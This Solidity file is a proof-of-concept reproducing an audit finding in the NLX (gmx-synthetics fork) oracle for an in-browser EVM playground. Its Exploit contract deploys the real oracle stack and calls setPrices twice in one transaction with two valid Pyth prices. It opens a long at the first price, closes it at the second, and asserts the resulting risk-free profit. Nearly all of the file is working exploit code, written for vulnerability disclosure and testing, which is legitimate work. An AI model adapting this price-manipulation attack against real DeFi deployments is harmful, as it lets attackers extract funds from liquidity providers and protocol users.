// SPDX-License-Identifier: MIT
// Cheatcode-free, single-transaction reproduction of AuditVault #50882 (Halborn /
// NLX = gmx-synthetics fork) for the in-browser EVM Playground. It deploys the
// REAL, unmodified NLX Oracle consumer (Oracle.sol + its real RoleStore / DataStore
// / EventEmitter / OracleStore dependency graph) and drives the REAL external
// setPrices() entrypoint twice inside ONE transaction. Because
// _setPricesFromPriceFeeds trusts whichever valid Pyth price the caller submits
// (no in-block deviation guard), the same token is assigned two different valid
// prices ~400ms apart in the same tx, letting a cash-settled long open at price A
// and close at price B for risk-free profit paid in real ERC20.
pragma solidity ^0.8.0;

import "../src/nlx/contracts/oracle/Oracle.sol";
import "../src/nlx/contracts/oracle/OracleStore.sol";
import "../src/nlx/contracts/oracle/OracleUtils.sol";
import "../src/nlx/contracts/data/DataStore.sol";
import "../src/nlx/contracts/data/Keys.sol";
import "../src/nlx/contracts/role/RoleStore.sol";
import "../src/nlx/contracts/role/Role.sol";
import "../src/nlx/contracts/event/EventEmitter.sol";
import "../src/nlx/contracts/price/Price.sol";
import "../src/pyth/PythStructs.sol";

// Honest, minimal signed-price feed we control (the ONLY non-audited piece).
// updatePriceFeeds records whatever price the (externally-signed) blob carries;
// getPrice returns the latest. Signature verification is external and irrelevant
// to the consumer bug -- the bug is that the real Oracle applies whichever valid
// recent price the caller submits.
contract ControlledPyth {
    mapping(bytes32 => PythStructs.Price) internal feed;

    function getUpdateFee(bytes[] calldata updateData) external pure returns (uint256) {
        return updateData.length;
    }

    function updatePriceFeeds(bytes[] calldata updateData) external payable {
        for (uint256 i; i < updateData.length; i++) {
            (bytes32 id, int64 price, uint64 conf, int32 expo, uint64 publishTime) =
                abi.decode(updateData[i], (bytes32, int64, uint64, int32, uint64));
            feed[id] = PythStructs.Price({price: price, conf: conf, expo: expo, publishTime: publishTime});
        }
    }

    function getPrice(bytes32 id) external view returns (PythStructs.Price memory) {
        return feed[id];
    }
}

contract MiniERC20 {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

// Thin real-ERC20 consumer pricing both legs off the REAL oracle (GMX-style
// settlement against Oracle.getPrimaryPrice). With one consistent per-block price
// entry == exit and pnl == 0; the pnl is entirely produced by the oracle bug.
contract CashSettledLong {
    Oracle public oracle;
    address public token;
    MiniERC20 public usd;

    struct Pos { uint256 size; uint256 entry; bool open; }
    mapping(address => Pos) public positions;

    constructor(Oracle _oracle, address _token, MiniERC20 _usd) {
        oracle = _oracle;
        token = _token;
        usd = _usd;
    }

    function openLong(uint256 size) external {
        uint256 entry = oracle.getPrimaryPrice(token).min;
        positions[msg.sender] = Pos(size, entry, true);
    }

    function closeLong() external returns (uint256 profit) {
        Pos storage p = positions[msg.sender];
        require(p.open, "no pos");
        uint256 exit = oracle.getPrimaryPrice(token).min;
        require(exit >= p.entry, "no gain");
        profit = p.size * (exit - p.entry);
        p.open = false;
        usd.transfer(msg.sender, profit);
    }
}

contract Exploit {
    bytes32 constant FEED_ID = bytes32(uint256(1));
    int64 constant PRICE_A = 226646416525; // valid Pyth price at t
    int64 constant PRICE_B = 226649088828; // valid Pyth price at t+11s (~400ms cadence)
    uint256 constant SIZE = 1_000_000;

    RoleStore public roles;
    DataStore public dataStore;
    OracleStore public oracleStore;
    EventEmitter public eventEmitter;
    Oracle public oracle;
    ControlledPyth public pyth;
    MiniERC20 public usd;
    MiniERC20 public tokenC;
    CashSettledLong public venue;
    address public token;

    uint256 public profit;

    function _params(int64 p) internal view returns (OracleUtils.SetPricesParams memory) {
        address[] memory t = new address[](1);
        t[0] = token;
        bytes[] memory d = new bytes[](1);
        d[0] = abi.encode(FEED_ID, p, uint64(1), int32(0), uint64(block.timestamp));
        return OracleUtils.SetPricesParams({tokens: t, pythUpdateData: d});
    }

    // Deploy + configure the REAL NLX oracle stack in the constructor so it lives
    // in initcode (uncapped under Paris); this keeps run()'s runtime under the
    // EIP-170 24KB limit. The `new` order is unchanged, so the deterministic
    // CREATE addresses used by the Playground config still hold.
    constructor() {
        roles = new RoleStore();                        // this Exploit => ROLE_ADMIN
        roles.grantRole(address(this), Role.CONTROLLER); // keeper role: setPrices + DataStore writes
        eventEmitter = new EventEmitter(roles);
        oracleStore = new OracleStore(roles, eventEmitter);
        dataStore = new DataStore(roles);
        pyth = new ControlledPyth();
        oracle = new Oracle(roles, oracleStore, address(pyth));
        roles.grantRole(address(oracle), Role.CONTROLLER); // oracle emits price events

        tokenC = new MiniERC20();
        token = address(tokenC);

        dataStore.setBytes32(Keys.priceFeedIdKey(token), FEED_ID);
        dataStore.setUint(Keys.priceFeedMultiplierKey(token), 1e30); // adjusted == raw pyth price
        dataStore.setUint(Keys.priceFeedHeartbeatDurationKey(token), 1 days);

        usd = new MiniERC20();
        venue = new CashSettledLong(oracle, token, usd);
        usd.mint(address(venue), 1e24); // counterparty (LP) reserve
    }

    function run() external payable {
        // ---- Leg 1: keeper prices the action with valid Pyth price A ----
        oracle.setPrices{value: 1}(dataStore, eventEmitter, _params(PRICE_A));
        uint256 pxA = oracle.getPrimaryPrice(token).min;
        venue.openLong(SIZE);
        oracle.clearAllPrices();

        // ---- Leg 2: SAME transaction, valid Pyth price B ----
        oracle.setPrices{value: 1}(dataStore, eventEmitter, _params(PRICE_B)); // @> VULN: no in-block deviation guard; second valid price is applied
        uint256 pxB = oracle.getPrimaryPrice(token).min;
        venue.closeLong();

        require(pxA == uint256(uint64(PRICE_A)), "leg1 price");
        require(pxB == uint256(uint64(PRICE_B)), "leg2 price");
        require(pxA != pxB, "two distinct in-block prices not recorded");

        profit = usd.balanceOf(address(this));
        require(profit == SIZE * (uint256(uint64(PRICE_B)) - uint256(uint64(PRICE_A))), "profit");
        require(profit == 2_672_303_000_000, "expected concrete arbitrage profit");
    }
}
